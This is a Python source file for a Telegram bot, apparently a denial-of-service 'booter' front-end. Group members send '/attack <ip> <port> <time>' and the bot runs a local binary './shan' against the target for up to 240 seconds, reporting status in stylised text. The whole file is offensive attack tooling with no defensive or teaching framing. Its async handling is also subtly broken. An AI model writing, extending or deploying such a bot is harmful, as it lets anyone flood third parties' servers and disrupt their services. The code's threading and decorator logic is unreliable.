import subprocess
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import threading

# Global variables
attack_in_progress = False
remaining_time = 0
attack_lock = threading.Lock()

def restrict_to_group(func):
    """Decorator to ensure commands are only used in a specific group."""
    def wrapper(update: Update, context: CallbackContext):
        specific_group_id = -1002186135876  # Replace with your group's chat ID
        if update.effective_chat.id != specific_group_id:
            context.bot.send_message(chat_id=update.effective_chat.id,
                                     text="This bot is usable only in a specific group. Join here: [Channel Link](https://t.me/+ZIisNQHB4apmNTM1)",
                                     parse_mode="Markdown")
            return
        return func(update, context)
    return wrapper

@restrict_to_group
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("Use /help to see all the functions. To initiate an attack, use the /attack command.")

@restrict_to_group
async def help_command(update: Update, context: CallbackContext):
    help_text = (
        "Available commands:\n"
        "/start - Introduction to the bot\n"
        "/help - List of commands\n"
        "/attack <ip> <port> <time> - Initiate an attack (time <= 240 sec)\n"
        "/status - Check attack status"
    )
    await update.message.reply_text(help_text)

@restrict_to_group
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, remaining_time, attack_lock

    try:
        args = context.args
        if len(args) != 3:
            await update.message.reply_text("Usage: /attack <ip> <port> <time>")
            return

        ip, port, time_str = args
        try:
            time_duration = int(time_str)
        except ValueError:
            await update.message.reply_text("Time must be an integer.")
            return

        if time_duration > 240:
            await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙖 𝙩𝙞𝙢𝙚 𝙤𝙛 240 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙤𝙧 𝙡𝙚𝙨𝙨.")
            return

        # Check and set attack state with lock
        with attack_lock:
            if attack_in_progress:
                await update.message.reply_text(f"𝘼𝙣 𝙖𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨. 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝙩𝙞𝙢𝙚: {remaining_time} 丂𝑒ĆØ𝐍𝓭丂.")
                return

            attack_in_progress = True
            remaining_time = time_duration
            await update.message.reply_text(f"ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ ɪɴᴠᴀꜱɪᴏɴ\n ɪᴘ - {ip}:\n ᴘᴏʀᴛ - {port} ꜰᴏʀ {time_duration} ꜱᴇᴄᴏɴᴅꜱ ʜᴀꜱ ꜱᴛᴀʀᴛᴇᴅ.")

        async def run_attack():
            global attack_in_progress, remaining_time
            try:
                subprocess.run(["./shan", ip, port, str(time_duration)], check=True)
            except Exception as e:
                print(f"Error executing attack: {e}")
            finally:
                # Reset state after attack
                with attack_lock:
                    attack_in_progress = False
                    remaining_time = 0
                await update.message.reply_text(f"Yσυɾ αƚƚαƈƙ σɳ {ip}\n ʜᴀꜱ ᴄᴏɴᴄʟᴜᴅᴇᴅ ᴀꜰᴛᴇʀ {time_duration} ꜱᴇᴄᴏɴᴅꜱ.")

        # Start the subprocess in a separate thread
        threading.Thread(target=run_attack).start()

    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")

@restrict_to_group
async def status(update: Update, context: CallbackContext):
    global attack_in_progress, remaining_time

    with attack_lock:
        if attack_in_progress:
            await update.message.reply_text(f"An attack is currently in progress. Remaining time: {remaining_time} seconds.")
        else:
            await update.message.reply_text("☀️The attack system is ready to go.☀️")

def main():
    # Replace 'YOUR_TOKEN' with your bot's API token
    application = Application.builder().token("YOUR_TOKEN").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status))

    application.run_polling()

if __name__ == "__main__":
    main()

